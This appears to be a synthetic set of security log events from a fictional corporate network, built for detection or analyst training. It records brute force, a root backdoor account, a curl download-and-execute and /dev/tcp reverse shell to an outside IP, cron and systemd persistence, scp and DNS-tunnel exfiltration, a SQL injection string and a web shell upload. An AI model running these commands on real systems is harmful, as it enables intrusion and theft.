{"_time": "2026-10-02T20:00:04Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "DC01", "EventCode": 4769, "TargetUserName": "helpdesk_tmp", "ServiceName": "HTTP/intranet", "IpAddress": "10.10.30.25", "TicketEncryptionType": "0x17", "ResultCode": "0x0"}
{"_time": "2026-10-02T20:00:08Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "DC01", "EventCode": 4769, "TargetUserName": "helpdesk_tmp", "ServiceName": "MSSQLSvc/sqlsrv02", "IpAddress": "10.10.30.25", "TicketEncryptionType": "0x17", "ResultCode": "0x0"}
{"_time": "2026-10-02T20:00:12Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "DC01", "EventCode": 4769, "TargetUserName": "helpdesk_tmp", "ServiceName": "CIFS/SRV-FILE01", "IpAddress": "10.10.30.25", "TicketEncryptionType": "0x17", "ResultCode": "0x0"}
{"_time": "2026-10-02T20:00:16Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "DC01", "EventCode": 4769, "TargetUserName": "helpdesk_tmp", "ServiceName": "HOST/DC01", "IpAddress": "10.10.30.25", "TicketEncryptionType": "0x17", "ResultCode": "0x0"}
{"_time": "2026-10-02T20:01:06Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "blocked", "src_ip": "91.219.237.18", "dest_ip": "10.10.40.20", "dest_port": 3306, "protocol": "TCP", "bytes_sent": 60, "bytes_received": 0}
{"_time": "2026-10-02T20:01:15Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "blocked", "src_ip": "91.219.237.18", "dest_ip": "10.10.40.20", "dest_port": 135, "protocol": "TCP", "bytes_sent": 60, "bytes_received": 0}
{"_time": "2026-10-02T20:01:19Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "blocked", "src_ip": "91.219.237.18", "dest_ip": "10.10.40.20", "dest_port": 139, "protocol": "TCP", "bytes_sent": 60, "bytes_received": 0}
{"_time": "2026-10-02T20:01:20Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "blocked", "src_ip": "91.219.237.18", "dest_ip": "10.10.40.20", "dest_port": 80, "protocol": "TCP", "bytes_sent": 60, "bytes_received": 0}
{"_time": "2026-10-02T20:01:20Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "blocked", "src_ip": "91.219.237.18", "dest_ip": "10.10.40.20", "dest_port": 5900, "protocol": "TCP", "bytes_sent": 60, "bytes_received": 0}
{"_time": "2026-10-02T20:01:21Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "blocked", "src_ip": "91.219.237.18", "dest_ip": "10.10.40.20", "dest_port": 21, "protocol": "TCP", "bytes_sent": 60, "bytes_received": 0}
{"_time": "2026-10-02T20:01:22Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "blocked", "src_ip": "91.219.237.18", "dest_ip": "10.10.40.20", "dest_port": 22, "protocol": "TCP", "bytes_sent": 60, "bytes_received": 0}
{"_time": "2026-10-02T20:01:23Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "blocked", "src_ip": "91.219.237.18", "dest_ip": "10.10.40.20", "dest_port": 23, "protocol": "TCP", "bytes_sent": 60, "bytes_received": 0}
{"_time": "2026-10-02T20:01:23Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "blocked", "src_ip": "91.219.237.18", "dest_ip": "10.10.40.20", "dest_port": 443, "protocol": "TCP", "bytes_sent": 60, "bytes_received": 0}
{"_time": "2026-10-02T20:01:25Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "blocked", "src_ip": "91.219.237.18", "dest_ip": "10.10.40.20", "dest_port": 25, "protocol": "TCP", "bytes_sent": 60, "bytes_received": 0}
{"_time": "2026-10-02T20:01:25Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "blocked", "src_ip": "91.219.237.18", "dest_ip": "10.10.40.20", "dest_port": 445, "protocol": "TCP", "bytes_sent": 60, "bytes_received": 0}
{"_time": "2026-10-02T20:01:29Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "blocked", "src_ip": "91.219.237.18", "dest_ip": "10.10.40.20", "dest_port": 3389, "protocol": "TCP", "bytes_sent": 60, "bytes_received": 0}
{"_time": "2026-10-02T20:01:40Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "blocked", "src_ip": "91.219.237.18", "dest_ip": "10.10.40.20", "dest_port": 8080, "protocol": "TCP", "bytes_sent": 60, "bytes_received": 0}
{"_time": "2026-10-02T20:01:43Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "blocked", "src_ip": "91.219.237.18", "dest_ip": "10.10.40.20", "dest_port": 8443, "protocol": "TCP", "bytes_sent": 60, "bytes_received": 0}
{"_time": "2026-10-02T20:04:00Z", "sourcetype": "email", "index": "web", "host": "MAIL-GW01", "sender": "updates@zoom.us", "recipient": "rfischer@corp.local", "subject": "Automated notification", "attachment": "none", "url": "none", "spf": "pass", "dkim": "pass", "verdict": "clean"}
{"_time": "2026-10-02T20:05:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.67.52", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 10876, "bytes_received": 129912}
{"_time": "2026-10-02T20:09:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.42.70", "dest_ip": "172.217.0.0", "dest_port": 443, "protocol": "TCP", "bytes_sent": 11593, "bytes_received": 106197}
{"_time": "2026-10-02T20:23:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_accepted", "user": "rfischer", "src_ip": "10.10.43.10", "method": "publickey"}
{"_time": "2026-10-02T20:35:01Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-ENG-021", "EventCode": 4634, "TargetUserName": "pwong", "LogonId": "0xecc18"}
{"_time": "2026-10-02T20:37:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "INSERT", "table": "inventory", "rows_returned": 109, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T20:41:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_accepted", "user": "kgupta", "src_ip": "10.10.43.11", "method": "publickey"}
{"_time": "2026-10-02T21:01:05Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.60.64", "url": "https://docs.google.com/document/d/abc123", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 3982}
{"_time": "2026-10-02T21:05:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "SELECT", "table": "inventory", "rows_returned": 45, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T21:05:18Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.56.94", "url": "https://intranet.corp.local/wiki", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 2945}
{"_time": "2026-10-02T21:26:20Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.52.99", "url": "https://outlook.office.com/mail/", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 4741}
{"_time": "2026-10-02T21:27:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "ListBuckets", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T21:37:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "ListBuckets", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T21:48:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-web02", "event": "sshd_accepted", "user": "rfischer", "src_ip": "10.10.45.13", "method": "publickey"}
{"_time": "2026-10-02T21:52:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "UPDATE", "table": "orders", "rows_returned": 196, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T21:54:07Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.63.48", "url": "https://intranet.corp.local/wiki", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 2733}
{"_time": "2026-10-02T21:55:01Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-FIN-014", "EventCode": 4634, "TargetUserName": "asmith", "LogonId": "0x741fc"}
{"_time": "2026-10-02T21:58:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "185.220.101.44", "dest_ip": "10.10.40.20", "dest_port": 22, "protocol": "TCP", "bytes_sent": 1200, "bytes_received": 800}
{"_time": "2026-10-02T22:00:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "blocked", "src_ip": "185.220.101.44", "dest_ip": "10.10.40.21", "dest_port": 22, "protocol": "TCP", "bytes_sent": 0, "bytes_received": 0}
{"_time": "2026-10-02T22:05:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_failed", "user": "root", "src_ip": "185.220.101.44", "reason": "bad_password"}
{"_time": "2026-10-02T22:05:08Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_failed", "user": "root", "src_ip": "185.220.101.44", "reason": "bad_password"}
{"_time": "2026-10-02T22:05:16Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_failed", "user": "root", "src_ip": "185.220.101.44", "reason": "bad_password"}
{"_time": "2026-10-02T22:05:24Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_failed", "user": "root", "src_ip": "185.220.101.44", "reason": "bad_password"}
{"_time": "2026-10-02T22:05:32Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_failed", "user": "root", "src_ip": "185.220.101.44", "reason": "bad_password"}
{"_time": "2026-10-02T22:05:40Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_failed", "user": "root", "src_ip": "185.220.101.44", "reason": "bad_password"}
{"_time": "2026-10-02T22:05:48Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_failed", "user": "root", "src_ip": "185.220.101.44", "reason": "bad_password"}
{"_time": "2026-10-02T22:05:56Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_failed", "user": "root", "src_ip": "185.220.101.44", "reason": "bad_password"}
{"_time": "2026-10-02T22:06:04Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_failed", "user": "root", "src_ip": "185.220.101.44", "reason": "bad_password"}
{"_time": "2026-10-02T22:06:12Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_failed", "user": "root", "src_ip": "185.220.101.44", "reason": "bad_password"}
{"_time": "2026-10-02T22:06:20Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_failed", "user": "root", "src_ip": "185.220.101.44", "reason": "bad_password"}
{"_time": "2026-10-02T22:06:28Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_failed", "user": "root", "src_ip": "185.220.101.44", "reason": "bad_password"}
{"_time": "2026-10-02T22:06:36Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_failed", "user": "root", "src_ip": "185.220.101.44", "reason": "bad_password"}
{"_time": "2026-10-02T22:06:44Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_failed", "user": "root", "src_ip": "185.220.101.44", "reason": "bad_password"}
{"_time": "2026-10-02T22:07:12Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_failed", "user": "admin", "src_ip": "185.220.101.44", "reason": "invalid_user"}
{"_time": "2026-10-02T22:07:20Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_failed", "user": "ubuntu", "src_ip": "185.220.101.44", "reason": "invalid_user"}
{"_time": "2026-10-02T22:07:28Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_failed", "user": "deploy", "src_ip": "185.220.101.44", "reason": "bad_password"}
{"_time": "2026-10-02T22:08:01Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sshd_accepted", "user": "deploy", "src_ip": "185.220.101.44", "method": "password"}
{"_time": "2026-10-02T22:08:05Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "sudo", "user": "deploy", "src_ip": "185.220.101.44", "command": "/bin/bash", "tty": "pts/3"}
{"_time": "2026-10-02T22:08:40Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "useradd", "actor": "deploy", "new_user": "sysupdate", "uid": 0, "gid": 0}
{"_time": "2026-10-02T22:08:55Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "usermod", "actor": "deploy", "target_user": "sysupdate", "group": "sudo"}
{"_time": "2026-10-02T22:09:08Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.40.20", "query": "185.220.101.44.in-addr.arpa", "answer": "NXDOMAIN", "record_type": "PTR", "response_code": "NXDOMAIN"}
{"_time": "2026-10-02T22:09:10Z", "sourcetype": "linux_bash", "index": "linux", "host": "lnx-app01", "user": "deploy", "command": "curl -s http://185.220.101.44/x.sh -o /tmp/.xs && chmod +x /tmp/.xs"}
{"_time": "2026-10-02T22:09:10Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.40.20", "dest_ip": "185.220.101.44", "dest_port": 80, "protocol": "TCP", "bytes_sent": 300, "bytes_received": 18000}
{"_time": "2026-10-02T22:09:20Z", "sourcetype": "linux_bash", "index": "linux", "host": "lnx-app01", "user": "deploy", "command": "/tmp/.xs &"}
{"_time": "2026-10-02T22:09:25Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "cron_add", "actor": "sysupdate", "schedule": "*/10 * * * *", "command": "/tmp/.xs"}
{"_time": "2026-10-02T22:09:40Z", "sourcetype": "linux_bash", "index": "linux", "host": "lnx-app01", "user": "sysupdate", "command": "bash -i >& /dev/tcp/185.220.101.44/4444 0>&1"}
{"_time": "2026-10-02T22:09:40Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.40.20", "dest_ip": "185.220.101.44", "dest_port": 4444, "protocol": "TCP", "bytes_sent": 900, "bytes_received": 52000}
{"_time": "2026-10-02T22:10:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-app01", "event": "systemd_service_created", "unit": "cache-helper.service", "exec_start": "/tmp/.xs", "actor": "sysupdate"}
{"_time": "2026-10-02T22:11:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.46.37", "query": "windowsupdate.microsoft.com", "answer": "13.90.71.186", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T22:12:00Z", "sourcetype": "linux_bash", "index": "linux", "host": "lnx-app01", "user": "sysupdate", "command": "tar czf /tmp/.bk.tgz /var/www/app/config /etc/passwd"}
{"_time": "2026-10-02T22:13:10Z", "sourcetype": "linux_bash", "index": "linux", "host": "lnx-app01", "user": "sysupdate", "command": "scp /tmp/.bk.tgz root@185.220.101.44:/tmp/"}
{"_time": "2026-10-02T22:13:10Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.40.20", "dest_ip": "185.220.101.44", "dest_port": 22, "protocol": "TCP", "bytes_sent": 3800000, "bytes_received": 1200}
{"_time": "2026-10-02T22:17:01Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-FIN-014", "EventCode": 4634, "TargetUserName": "svc_backup", "LogonId": "0xcc4e1"}
{"_time": "2026-10-02T22:18:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "tOlawale", "src_ip": "10.10.62.44", "endpoint": "/api/notifications", "method": "GET", "status": 200, "response_time_ms": 273, "auth_result": "n/a"}
{"_time": "2026-10-02T22:19:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.68.13", "dest_ip": "13.107.42.14", "dest_port": 443, "protocol": "TCP", "bytes_sent": 11129, "bytes_received": 16711}
{"_time": "2026-10-02T22:19:00Z", "sourcetype": "email", "index": "web", "host": "MAIL-GW01", "sender": "updates@zoom.us", "recipient": "dnair@corp.local", "subject": "Automated notification", "attachment": "none", "url": "none", "spf": "pass", "dkim": "pass", "verdict": "clean"}
{"_time": "2026-10-02T22:20:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.40.20", "dest_ip": "185.220.101.44", "dest_port": 4444, "protocol": "TCP", "bytes_sent": 210, "bytes_received": 340}
{"_time": "2026-10-02T22:23:13Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-MKT-007", "EventCode": 4634, "TargetUserName": "rfischer", "LogonId": "0x54dbe"}
{"_time": "2026-10-02T22:27:00Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.56.78", "url": "https://docs.google.com/document/d/abc123", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 3183}
{"_time": "2026-10-02T22:30:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.40.20", "dest_ip": "185.220.101.44", "dest_port": 4444, "protocol": "TCP", "bytes_sent": 210, "bytes_received": 340}
{"_time": "2026-10-02T22:30:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.60.72", "query": "npmjs.org", "answer": "13.110.5.24", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T22:30:05Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.40.20", "query": "xqzpvmrltk.info", "answer": "185.220.101.44", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T22:31:05Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.40.20", "query": "bq9f3k1z.top", "answer": "185.220.101.44", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T22:32:05Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.40.20", "query": "mv7h2plqrs.biz", "answer": "185.220.101.44", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T22:40:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.40.20", "dest_ip": "185.220.101.44", "dest_port": 4444, "protocol": "TCP", "bytes_sent": 210, "bytes_received": 340}
{"_time": "2026-10-02T22:50:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.40.20", "dest_ip": "185.220.101.44", "dest_port": 4444, "protocol": "TCP", "bytes_sent": 210, "bytes_received": 340}
{"_time": "2026-10-02T23:00:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.40.20", "dest_ip": "185.220.101.44", "dest_port": 4444, "protocol": "TCP", "bytes_sent": 210, "bytes_received": 340}
{"_time": "2026-10-02T23:00:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.40.20", "query": "00a1f9c3.exfil.badchannel.net", "answer": "0.0.0.0", "record_type": "TXT", "response_code": "NOERROR"}
{"_time": "2026-10-02T23:01:03Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.40.20", "query": "01a1f9c3.exfil.badchannel.net", "answer": "0.0.0.0", "record_type": "TXT", "response_code": "NOERROR"}
{"_time": "2026-10-02T23:02:06Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.40.20", "query": "02a1f9c3.exfil.badchannel.net", "answer": "0.0.0.0", "record_type": "TXT", "response_code": "NOERROR"}
{"_time": "2026-10-02T23:03:09Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.40.20", "query": "03a1f9c3.exfil.badchannel.net", "answer": "0.0.0.0", "record_type": "TXT", "response_code": "NOERROR"}
{"_time": "2026-10-02T23:04:12Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.40.20", "query": "04a1f9c3.exfil.badchannel.net", "answer": "0.0.0.0", "record_type": "TXT", "response_code": "NOERROR"}
{"_time": "2026-10-02T23:04:30Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-MKT-007", "EventCode": 4634, "TargetUserName": "intern_kpatel", "LogonId": "0x9bcd9"}
{"_time": "2026-10-02T23:05:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.53.22", "dest_ip": "13.107.42.14", "dest_port": 443, "protocol": "TCP", "bytes_sent": 15038, "bytes_received": 45611}
{"_time": "2026-10-02T23:05:15Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.40.20", "query": "05a1f9c3.exfil.badchannel.net", "answer": "0.0.0.0", "record_type": "TXT", "response_code": "NOERROR"}
{"_time": "2026-10-02T23:06:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "SELECT", "table": "inventory", "rows_returned": 68, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T23:06:18Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.40.20", "query": "06a1f9c3.exfil.badchannel.net", "answer": "0.0.0.0", "record_type": "TXT", "response_code": "NOERROR"}
{"_time": "2026-10-02T23:06:20Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-MKT-007", "EventCode": 4634, "TargetUserName": "intern_kpatel", "LogonId": "0xc2ae8"}
{"_time": "2026-10-02T23:07:21Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.40.20", "query": "07a1f9c3.exfil.badchannel.net", "answer": "0.0.0.0", "record_type": "TXT", "response_code": "NOERROR"}
{"_time": "2026-10-02T23:08:24Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.40.20", "query": "08a1f9c3.exfil.badchannel.net", "answer": "0.0.0.0", "record_type": "TXT", "response_code": "NOERROR"}
{"_time": "2026-10-02T23:09:27Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.40.20", "query": "09a1f9c3.exfil.badchannel.net", "answer": "0.0.0.0", "record_type": "TXT", "response_code": "NOERROR"}
{"_time": "2026-10-02T23:10:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.40.20", "dest_ip": "185.220.101.44", "dest_port": 4444, "protocol": "TCP", "bytes_sent": 210, "bytes_received": 340}
{"_time": "2026-10-02T23:10:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "rfischer", "query_type": "SELECT", "table": "customers", "rows_returned": 48210, "client_ip": "10.10.44.25", "note": "full_table_scan"}
{"_time": "2026-10-02T23:11:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "rfischer", "query_type": "SELECT", "table": "payment_methods", "rows_returned": 12040, "client_ip": "10.10.44.25"}
{"_time": "2026-10-02T23:15:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "sa", "query_type": "GRANT", "table": "payment_methods", "rows_returned": 0, "client_ip": "10.10.44.25", "note": "GRANT SELECT TO rfischer_bkp"}
{"_time": "2026-10-02T23:20:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.40.20", "dest_ip": "185.220.101.44", "dest_port": 4444, "protocol": "TCP", "bytes_sent": 210, "bytes_received": 340}
{"_time": "2026-10-02T23:20:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "rfischer_bkp", "query_type": "SELECT", "table": "payment_methods", "rows_returned": 12040, "client_ip": "10.10.44.25"}
{"_time": "2026-10-02T23:30:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.40.20", "dest_ip": "185.220.101.44", "dest_port": 4444, "protocol": "TCP", "bytes_sent": 210, "bytes_received": 340}
{"_time": "2026-10-02T23:30:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "dnair", "src_ip": "10.10.52.94", "endpoint": "/api/profile", "method": "GET", "status": 200, "response_time_ms": 186, "auth_result": "n/a"}
{"_time": "2026-10-02T23:40:01Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-HR-003", "EventCode": 4634, "TargetUserName": "tOlawale", "LogonId": "0x4f7cf"}
{"_time": "2026-10-02T23:44:00Z", "sourcetype": "email", "index": "web", "host": "MAIL-GW01", "sender": "updates@zoom.us", "recipient": "dnair@corp.local", "subject": "Automated notification", "attachment": "none", "url": "none", "spf": "pass", "dkim": "pass", "verdict": "clean"}
{"_time": "2026-10-02T23:45:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.43.30", "query": "github.com", "answer": "13.66.149.7", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T23:47:23Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-FIN-014", "EventCode": 4634, "TargetUserName": "tOlawale", "LogonId": "0x27c4e"}
{"_time": "2026-10-03T09:00:00Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-ENG-021", "EventCode": 4624, "TargetUserName": "tOlawale", "LogonType": 2, "src_ip": "127.0.0.1", "LogonId": "0x91a001", "Status": "0x0"}
{"_time": "2026-10-03T09:05:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "tOlawale", "src_ip": "10.10.50.18", "endpoint": "/api/hr/records?dept=engineering", "method": "GET", "status": 200, "response_time_ms": 140, "auth_result": "n/a"}
{"_time": "2026-10-03T11:00:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.50.18", "dest_ip": "140.82.112.3", "dest_port": 443, "protocol": "TCP", "bytes_sent": 180000000, "bytes_received": 5000, "hostname": "github.com"}
{"_time": "2026-10-03T14:30:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "tOlawale", "src_ip": "10.10.50.18", "endpoint": "/api/hr/records?dept=sales", "method": "GET", "status": 200, "response_time_ms": 150, "auth_result": "n/a", "note": "outside normal role scope"}
{"_time": "2026-10-03T14:45:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "tOlawale", "src_ip": "10.10.50.18", "endpoint": "/api/hr/records?dept=finance", "method": "GET", "status": 200, "response_time_ms": 160, "auth_result": "n/a"}
{"_time": "2026-10-03T20:10:00Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-ENG-021", "EventCode": 4624, "TargetUserName": "tOlawale", "LogonType": 2, "src_ip": "127.0.0.1", "LogonId": "0x91b220", "Status": "0x0", "note": "after-hours badge+logon correlated"}
{"_time": "2026-10-03T20:20:00Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-ENG-021", "EventCode": 11, "User": "CORP\\tOlawale", "Image": "C:\\Program Files\\7-Zip\\7z.exe", "TargetFilename": "C:\\Users\\tOlawale\\Documents\\archive_backup.zip"}
{"_time": "2026-10-03T20:21:00Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-ENG-021", "EventCode": 1, "User": "CORP\\tOlawale", "Image": "C:\\Program Files\\7-Zip\\7z.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "7z.exe a archive_backup.zip C:\\Shares\\HR_Export C:\\Shares\\Sales_Export C:\\Shares\\Finance_Export"}
{"_time": "2026-10-03T20:30:00Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.50.18", "url": "https://personal-cloud-drive.example.com/upload", "method": "POST", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 215000000}
{"_time": "2026-10-03T20:31:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.50.18", "dest_ip": "104.21.9.14", "dest_port": 443, "protocol": "TCP", "bytes_sent": 215000000, "bytes_received": 4000, "hostname": "personal-cloud-drive.example.com"}
{"time": "2026-10-06T02:14:01Z", "index": "web", "sourcetype": "app:auth", "src_ip": "146.70.112.45", "url": "/login.php", "method": "POST", "payload": "username=admin' OR 1=1--&password=a", "status": 200, "user_agent": "sqlmap/1.5.8#dev (http://sqlmap.org)"}
{"time": "2026-10-06T02:14:05Z", "index": "web", "sourcetype": "app:auth", "src_ip": "146.70.112.45", "url": "/admin/upload.php", "method": "POST", "payload": "file=shell.php", "status": 200, "user_agent": "Mozilla/5.0"}
